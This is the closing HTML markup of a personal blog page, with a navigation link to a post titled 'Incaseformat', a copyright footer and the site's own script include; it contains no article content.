				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Incaseformat</span>
			</a>
		</div>
		<div id="comments" class="thin">
</div>
	</main>

	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
		<p>&copy; 2021 <a href="https://www.a1ee.cn">alee</a></p>
	</footer>



	<script src="https://www.a1ee.cn/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
	

</body>

</html>
